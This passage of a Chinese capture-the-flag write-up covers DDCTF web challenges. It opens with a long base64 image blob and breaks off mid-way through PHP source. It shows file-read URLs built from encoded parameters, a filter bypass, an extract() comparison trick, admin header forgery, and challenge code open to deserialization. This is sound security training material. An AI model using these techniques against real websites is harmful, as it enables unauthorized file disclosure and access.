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&#39;&gt;&lt;/img&gt; 于是在思考是否可以构造index.php来读取源码 构造urlhttp://117.51.150.246/index.php?jpg=TmprMlJUWTBOalUzT0RKRk56QTJPRGN3获取了index.php的源码 &lt;?php /* * https://blog.csdn.net/FengBanLiuYun/article/details/80616607 * Date: July 4,2018 */ error_reporting(E_ALL || ~E_NOTICE); header(&#39;content-type:text/html;charset=utf-8&#39;); if(! isset($_GET[&#39;jpg&#39;])) header(&#39;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&#39;); $file = hex2bin(base64_decode(base64_decode($_GET[&#39;jpg&#39;]))); echo &#39;&lt;title&gt;&#39;.$_GET[&#39;jpg&#39;].&#39;&lt;/title&gt;&#39;; $file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file); echo $file.&#39;&lt;/br&gt;&#39;; $file = str_replace(&quot;config&quot;,&quot;!&quot;, $file); echo $file.&#39;&lt;/br&gt;&#39;; $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src=&#39;data:image/gif;base64,&quot;.$txt.&quot;&#39;&gt;&lt;/img&gt;&quot;; /* * Can you find the flag file? * */ ?&gt; 发现提示给了一篇博客地址和一个日期 让我们找到了这样的一篇文章 尝试了多次之后发现是 http://117.51.150.246/practice.txt.swp 发现了f1ag!ddctf.php于是想读取他的源码由于index页面做过限制,·file参数只能输入字母和数字,但是他将config替换为!于是构造f1agconfigddctf.php来进行绕过。base64解密就能得到源码 &lt;?php include(&#39;config.php&#39;); $k = &#39;hello&#39;; extract($_GET); if(isset($uid)) { $content=trim(file_get_contents($k)); if($uid==$content) { echo $flag; } else { echo&#39;hello&#39;; } } ?&gt; 审计一下 发现可以绕过 得到flag DDCTF{436f6e67726174756c6174696f6e73} web签到题打开页面发现没有登陆权限 查看源代码发现了index.js里面的内容 /** * Created by PhpStorm. * User: didi * Date: 2019/1/13 * Time: 9:05 PM */ function auth() { $.ajax({ type: &quot;post&quot;, url:&quot;http://117.51.158.44/app/Auth.php&quot;, contentType: &quot;application/json;charset=utf-8&quot;, dataType: &quot;json&quot;, beforeSend: function (XMLHttpRequest) { XMLHttpRequest.setRequestHeader(&quot;didictf_username&quot;, &quot;&quot;); }, success: function (getdata) { console.log(getdata); if(getdata.data !== &#39;&#39;) { document.getElementById(&#39;auth&#39;).innerHTML = getdata.data; } },error:function(error){ console.log(error); } }); } 发现了app/Auth.php页面，而且发现了head头可以有didictf_username 尝试在app/Auth.php页面伪造header头didictf_username:admin 访问app/fL2XID2i0Cdh.php页面发现题目的源码 url:app/Application.php Class Application { var $path = &#39;&#39;; public function response($data, $errMsg = &#39;success&#39;) { $ret = [&#39;errMsg&#39; =&gt; $errMsg, &#39;data&#39; =&gt; $data]; $ret = json_encode($ret); header(&#39;Content-type: application/json&#39;); echo $ret; } public function auth() { $DIDICTF_ADMIN = &#39;admin&#39;; if(!empty($_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;]) &amp;&amp; $_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;] == $DIDICTF_ADMIN) { $this-&gt;response(&#39;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&#39;); return TRUE; }else{ $this-&gt;response(&#39;抱歉，您没有登陆权限，请获取权限后访问-----&#39;,&#39;error&#39;); exit(); } } private function sanitizepath($path) { $path = trim($path); $path=str_replace(&#39;../&#39;,&#39;&#39;,$path); $path=str_replace(&#39;..\\\\&#39;,&#39;&#39;,$path); return $path; } public function __destruct() { if(empty($this-&gt;path)) { exit(); }else{ $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) { exit(); } $this-&gt;response($data=file_get_contents($path),&#39;Congratulations&#39;); } exit(); } } url:app/Session.php include &#39;Application.php&#39;; class Session extends Application { //key建议为8位字符串 var $eancrykey = &#39;&#39;; var $cookie_expiration = 7200; var $cookie_name = &#39;ddctf_id&#39;; var $cookie_path = &#39;&#39;; var $cookie_domain = &#39;&#39;; var $cookie_secure = FALSE; var $activity = &quot;DiDiCTF&quot;; public function index() { if(parent::auth()) { $this-&gt;get_key(); if($this-&gt;session_read()) { $data = &#39;DiDI Welcome you %s&#39;; $data = sprintf($data,$_SERVER[&#39;HTTP_USER_AGENT&#39;]); parent::response($data,&#39;sucess&#39;); }else{ $this-&gt;session_create(); $data = &#39;DiDI Welcome you&#39;; parent::response($data,&#39;sucess&#39;); } } } private function get_key() { //eancrykey and flag under the folder $this-&gt;eancrykey = file_get_contents(&#39;../config/key.txt&#39;); } public function session_read() { if(empty($_COOKIE)) { return FALSE; } $session = $_COOKIE[$this-&gt;cookie_name]; if(!isset($session)) { parent::response(&quot;session not found&quot;,&#39;error&#39;); return FALSE; } $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this-&gt;eancrykey.$session)) { parent::response(&quot;the cookie data not match&quot;,&#39;error&#39;); return FALSE; } $session = unserialize($session); if(!is_array($session) OR !isset($session[&#39;session_id&#39;]) OR !isset($session[&#39;ip_address&#39;]) OR !isset($session[&#39;user_agent&#39;])){ return FALSE; } if(!empty($_POST[&quot;nickname&quot;])) { $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey); $data = &quot;Welcome my friend %s&quot;; foreach ($arr as $k =&gt; $v) { 